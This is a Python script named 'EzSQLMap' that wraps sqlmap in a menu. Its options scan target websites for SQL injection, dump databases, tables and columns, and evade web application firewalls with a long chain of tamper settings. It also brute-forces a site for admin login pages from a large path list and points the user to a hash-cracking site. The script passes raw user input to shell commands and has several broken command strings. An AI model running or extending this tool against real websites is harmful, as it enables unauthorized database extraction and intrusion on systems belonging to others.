import os
import time
import webbrowser
import urllib.request
import sys

os.system("clear")

webbrowser.get("firefox").open("http://kurd-h.org/")
def main():
    try:
       print("""\033[93m
        ___
       __H__
 ___ ___[,]_____ ___ ___  {EzSQLMap}
|_ -| . [,]     | .'| . | Developed By Zecroma
|___|_  [(]_|_|_|__,|  _| Twitter:@PaawaaaKawa
      |_|V...       |_|   http://kurd-h.org/

""")
       
       url = input("\033[1;32mInput A SQL Injection Website:")
       symbol = ("'")
       website = symbol+url+symbol 
       os.system("clear")
       def inio():
           while True:
               print("""\033[93m
        ___
       __H__
 ___ ___[,]_____ ___ ___  {EzSQLMap}
|_ -| . [,]     | .'| . | Developed By Zecroma
|___|_  [(]_|_|_|__,|  _| Twitter:@PaawaaaKawa
      |_|V...       |_|   http://kurd-h.org/

1) Scan Only A Website
2) Scan A Database
3) Get A Table
4) Get A columns
5) Scan A Database (WAF Bypass)
6) Scan A Table (WAF Bypass)
7) Scan A Colums (WAF Bypass)
8) Get A Admin Panel
9) Hash Website For Decrypt
""")


               opcion0 = input("\033[1;36mezsqlmap > \033[1;m")
               wafpy = "--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes"
               if opcion0 == "1":
                   os.system("sqlmap -u " + website)
               elif opcion0 == "2":
                   os.system("sqlmap -u " + website + "--dbs")
                
               elif opcion0 == "3":

                    table = input("\033[1;32mInput A Database To Get Tables:")
                    os.system("sqlmap -u " + website + "--tables -D " + table)
               elif opcion0 == "4":
                    table1 = input("\033[1;32mInput A Database To Get Tables:")
                    column = input("\033[1;32mInput A Table To Get Columns:")
                    os.system("sqlmap -u " + website + "--tables -D " + table1 + "-T " + column)
               elif opcion0 == "5":
                   os.system("sqlmap -u " + website + "--dbs " + wafpy)
               elif opcion0 == "6":
                   tablep = input("\033[1;32mInput A Database To Get Tables:")
                   os.system("sqlmap -u " + website + "--tables -D " + tablep + wafpy)
               elif opcion0 == "7":
                   tablep1 = input("\033[1;32mInput A Database To Get Tables:")
                   columnp = input("\033[1;32mInput A Table To Get Columns:")
                   os.system("sqlmap -u " + website + "--tables -D " + tablep1 + "-T " + column + wafpy)
               elif opcion0 == "8": 
                   print("""\033[93m
        ___
       __H__
 ___ ___[,]_____ ___ ___  {EzSQLMap}
|_ -| . [,]     | .'| . | Developed By Zecroma
|___|_  [(]_|_|_|__,|  _| Twitter:@PaawaaaKawa
      |_|V...       |_|   http://kurd-h.org/
                         The Admin Panel Finder                  
""")
                   print ("\033[95mFirst Protocol HTTPS:// HTTP://")
                   print("\033[95m And (/) In Final")
                   print("\033[95mExmaple:http://www.ex.com/")
                   url = input("\033[97 Input A Website:")
                   ad = 'admin/','admin.asp/','admin/admin.asp/','admin.aspx/','admin/admin.aspx/','admin.php/','administrator/','login.php','admin.php','user/','usuarios/','usuario/','Admin/','cpanel/','phpmyadmin/','dashboard','cms/','users/','wp-login.php/','admin/login','auth/login/','moderator/','webadmin/','webmaster/','adminarea/','bb-admin/','wp-admin/','wp-login/','wp-admin.php','userlogin/','logins/','login.html','adminLogin/','admin_area/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','panel/','forum/admin','adm/','cp/','vue-element-admin','admin/cp.php','cp.php','admincontrol/','admincp/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html','admin_area/index.php','dashboard.html','dashboard.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html','admin/controlpanel.php','admincp/index.asp','admincp/login.asp','admincp/index.html','adminpanel.html','webadmin.html','webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php','administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php','members/','bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','modelsearch/login.php','moderator.php','moderator/login.php','moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php','admin/adminLogin.html','adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html','webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html','administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','modelsearch/login.html','moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html','panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','adminarea/index.php','adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php','modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php','adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','admin.php','login.php','login1.php','panel.php','admin1.php','admin2.php','admin3.php','admin4.php','moderator.','webadmin.','user.','administration/','mag/admin/','joomla/administrator/','manager/','adminpanel/','controlpanel/','logon/','auth/','apanel/','a/','acart/','access/','account/','achievo/','address/','admins/','0admin/','admin1/','admin2/','admin3/','admin4/','admin5/','_adm_/','_admin_/','_administrator_/','_adm/','_admin/','achtung/','_administrator/','AdminWeb/','administration.php','links/login.php','cms/_admin/logon.php','typo3/','pma/','cms/login/','access.php','sysadm.php','adm2/','include/admin.php','admin/moderator.php','interactive/admin.php','edit.php','siteadmin/','hcaadmin.php','svn/','blog/wp-login.php','admin/log.php','login/login.php','adminka.php','wholesale-login.php','authorize.php','editor/','base/admin/','includes/login.php','site_admin/login.php','statredir/','lists/admin/','sec/login.php','bitrix/admin/','admin_tool/','cabinet/','klarnetCMS/','debug/rus/autorisation/','cms/admin/','Admin/private/','site/admin/','admen/','admin2/index/','db/admin.php','admin/adm.php','admin/admin/','manager/ispmgr/','phpMyAdmin/','login.aspx/','admin/login.asp','admin/login.aspx/','moderator/admin.asp/','webadmin.asp/','webadmin/admin.asp/','author/Admin.aspx/','admin/userAdmin.aspx/','dbadmin/','AdministratorS/Admin.aspx/','admin/secure/admin.aspx/','bb-admin/admin.asp/','processlogin.php/','0manager/','acceso.asp/','acceso.aspx/','account.asp/','account.aspx/','wp-login.asp/','wp-login.aspx/','admin_login/','admin-login/','modelsearch/','nsw/','rcjakar/','private.php/','_vti_pvt/','_private/','admin1.php','admin2.html','yonetim.php','yonetim.html','nedmin/production/login.php','nedmin/production/index.php','yonetici.php','yonetici.html','admin1.asp','admin2.asp','yonetim.asp','yonetici.asp','admin/index.asp','admin/home.asp','admin/controlpanel.asp','sysadmin.php','sysadmin.html','sysadmin/','ur-admin.asp','ur-admin.php','ur-admin.html','ur-admin/','administr8.php','administr8.html','administr8/','admin/acceso.php/','admin/acceso.asp/','admin/acceso.aspx/','admin_area/acceso.php/','admin_area/acceso.asp/','admin_area/acceso.aspx/','adminarea/acceso.php/','adminarea/acceso.asp/','adminarea/acceso.aspx/','admincontrol/acceso.php/','admincontrol/acceso.asp/','admincontrol/acceso.aspx/','admincpacceso.php/','admincpacceso.asp/','admincpacceso.aspx/','administrator/acceso.php/','administrator/acceso.asp/','administrator/acceso.aspx/','admin_login/acceso.php/','admin_login/acceso.asp/','admin_login/acceso.aspx/','adminlogin/acceso.php/','adminlogin/acceso.asp/','adminlogin/acceso.aspx/','webadmin/wp-login.php/','webadmin/wp-login.asp/','webadmin/wp-login.aspx/','usuario/wp-login.php/','usuario/wp-login.asp/','usuario/wp-login.aspx/','admin/webadmin.asp/','admin/webadmin.aspx/','admin/webadmin.php/','webadmin/user.php/','webadmin/user.asp/','webadmin/user.aspx/','bb-admin/user.php','bb-admin/user.asp','bb-admin/user.aspx','controlpanel/user.php','controlpanel/user.asp','controlpanel/user.aspx','admin-login/user.php','admin-login/user.asp','admin-login/user.aspx','administrator/user.php','administrator/user.asp','administrator/user.aspx','admin/user.php','adm/user.php','pages/moderator.php','webadmin/moderator.php','users/moderator.php','usuario/user.php/','usuario/user.asp/','usuario/user.aspx/','mysql/','myadmin/','sqlmanager/','mysqlmanager/','p/m/a/','phpmanager/','php-myadmin/','phpmy-admin/','sqlweb/','websql/','webdb/','mysqladmin/','mysql-admin/','phpmyadmin2/','phpMyAdmin-2/','php-my-admin/','phpMyAdmin-2.2.3/','phpMyAdmin-2.2.6/','phpMyAdmin-2.5.1/','phpMyAdmin-2.5.4/','phpMyAdmin-2.5.5-rc1/','phpMyAdmin-2.5.5-rc2/','phpMyAdmin-2.5.5/','phpMyAdmin-2.5.5-pl1/','phpMyAdmin-2.5.6-rc1/','phpMyAdmin-2.5.6-rc2/','phpMyAdmin-2.5.6/','phpMyAdmin-2.5.7/','phpMyAdmin-2.5.7-pl1/','phpMyAdmin-2.6.0-alpha/','phpMyAdmin-2.6.0-alpha2/','phpMyAdmin-2.6.0-beta1/','phpMyAdmin-2.6.0-beta2/','phpMyAdmin-2.6.0-rc1/','phpMyAdmin-2.6.0-rc2/','phpMyAdmin-2.6.0-rc3/','phpMyAdmin-2.6.0/','phpMyAdmin-2.6.0-pl1/','phpMyAdmin-2.6.0-pl2/','phpMyAdmin-2.6.0-pl3/','phpMyAdmin-2.6.1-rc1/','phpMyAdmin-2.6.1-rc2/','phpMyAdmin-2.6.1/','phpMyAdmin-2.6.1-pl1/','phpMyAdmin-2.6.1-pl2/','phpMyAdmin-2.6.1-pl3/','phpMyAdmin-2.6.2-rc1/','phpMyAdmin-2.6.2-beta1/','phpMyAdmin-2.6.2/','phpMyAdmin-2.6.2-pl1/','phpMyAdmin-2.6.3/','phpMyAdmin-2.6.3-rc1/','phpMyAdmin-2.6.3-pl1/','phpMyAdmin-2.6.4-rc1/','phpMyAdmin-2.6.4-pl1/','phpMyAdmin-2.6.4-pl2/','phpMyAdmin-2.6.4-pl3/','phpMyAdmin-2.6.4-pl4/','phpMyAdmin-2.6.4/','phpMyAdmin-2.7.0-beta1/','phpMyAdmin-2.7.0-rc1/','phpMyAdmin-2.7.0-pl1/','phpMyAdmin-2.7.0-pl2/','phpMyAdmin-2.7.0/','phpMyAdmin-2.8.0-beta1/','phpMyAdmin-2.8.0-rc2/','phpMyAdmin-2.8.0/','phpMyAdmin-2.8.0.1/','phpMyAdmin-2.8.0.2/','phpMyAdmin-2.8.0.3/','phpMyAdmin-2.8.0.4/','phpMyAdmin-2.8.1-rc1/','phpMyAdmin-2.8.1/','phpMyAdmin-2.8.2/','pma2005/','administratie/','admins.php','useradmin/','sysadmins/','system-administration/','administrators/','pgadmin/','directadmin/','sql-admin/','newsadmin/','adminpro/','staradmin/','ServerAdministrator/','SysAdmin/','administer/','LiveUser_Admin/','sys-admin/','autologin/','support_login/','memlogin/','login-redirect/','sub-login/','login1/','dir-login/','login_db/','xlogin/','smblogin/','customer_login/','UserLogin/','acct_login/','bigadmin/','project-admins/','phppgadmin/','pureadmin/','bbadmin/','administratoraccounts/','AdminTools/','server/','database_administration/','power_user/','system_administration/','adminitem/','sysadm/','control/','accounts/','management/','phpSQLiteAdmin/','showlogin/','0admin/login.asp','0manager/admin.asp','admin/sendfile.asp','admin/sndfile.asp','admin/upfile.asp','admin/upload.asp','admin/uploadfaceok.asp','admin/uploads.asp','admin/uppic.asp','adminadmin/','adminindex/','count_admin','default_admin','index/admin','acesso/','adimin/','adiministrador/','adm/admin/','admin4_account/','admin4_colon/','admin/adm/','administracao/','banneradmin/','blogindex/','cadmins/','ccp14admin/','cmsadmin/','config/','controle/','cpanel_file/','donos/','edit/','entrar','entrar.html','entrar.php','ezsqliteadmin/','formslogin/','funcoes/','globes_admin/','hpwebjetadmin/','Indy_admin/','irc-macadmin/','key/','logar/','login/','loginflat/','login-us/','loginuser/','loginusuarios/','logo_sysadmin/','logout/','Lotus_Domino_Admin/','macadmin/','manuallogin/','membros/','meta_login/','navSiteAdmin/','net/','not/','openvpnadmin/','painel/','paineldecontrole/','pc/','pdc/','php/','phpldapadmin/','platz_login/','radmind/','radmind-1/','rcLogin/','saff/','senha/','senhas/','server_admin_small/','sff/','simpleLogin/','sistema/','sshadmin/','ss_vms_admin_sm/','Super-Admin/','SysAdmin2/','userlogin/','utility_login/','vadmind/','vmailadmin/','wizmysqladmin/','ccms/','ccms/login.php','ccms/index.php'

                   passe = ad
                   for hani in passe :
                       curl = url+hani
                       try :
                           openurl = urllib.request.urlopen(curl)
                           print("\033[92m[+]Admin Panel Found !:" + curl)
                           close = input("\033[94mPlease Enter To Close :)")
                       except urllib.error.HTTPError as msg :
                           print("\033[91m[-] Admin Panel Not Found :"+ curl)
               elif opcion0 == "9":
                   
                   print("\033[94mWait 5 Second To Open A Hack Decrypt Website")
                   print("\033[93mAlert! You Must Have Firefox To Open")
                   time.sleep(5)
                   webbrowser.get("firefox").open("https://hashes.com/en/decrypt/hash")
                   print("\033[1mIf Website Does Not Open This Is A Link https://hashes.com/en/decrypt/hash")
               
               elif opcion0 == "help":
                   print("""\033[93m

Number One To Four Without WAF Bypass
Number Four To Seven With WAF Bypass
Number Eight Admin Panel Finder
Number Nine Website For Hash Crack
exit, goback = Back To Home
If This Script Have A Bug And Something Else Contact Me On Twitter
Twitter:@PaawaaaKawa""")
               elif opcion0 == "exit":
                   print("\033[95mThanks For Using This Script Hope Enjoy,  \033[31mBijî Serok Apo, \033[33mBijî Kurd \033[32mBijî Kurdistan")
                   sys.exit()

        
        

                                
                    
                    
                
       inio()
    except KeyboardInterrupt:


        print("Thanks For Using Script See Ya Later")
if __name__ == "__main__":
    main()

                
